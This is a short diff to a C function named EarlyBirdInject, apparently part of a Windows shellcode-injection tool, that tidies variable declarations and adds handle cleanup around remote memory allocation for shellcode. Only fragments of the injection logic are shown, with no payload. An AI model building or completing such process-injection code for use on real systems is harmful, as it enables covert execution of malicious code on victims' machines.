@@ -56,9 +56,9 @@ BOOL EarlyBirdInject
 
 {
 
-	BOOL State = TRUE;
-	SIZE_T BytesWritten = NULL;
-	DWORD dwOldProt = NULL;
+	BOOL	State			= TRUE;
+	SIZE_T	BytesWritten	= NULL;
+	DWORD	dwOldProt		= 0;
 
 	*pAddress = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (*pAddress == NULL)
@@ -105,6 +105,13 @@ BOOL EarlyBirdInject
 	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);
 
 CLEANUP:
+
+	if (hThread)
+		CloseHandle(hThread);
+
+	if (hProcess)
+		CloseHandle(hProcess);
+
 
 	return State;
 
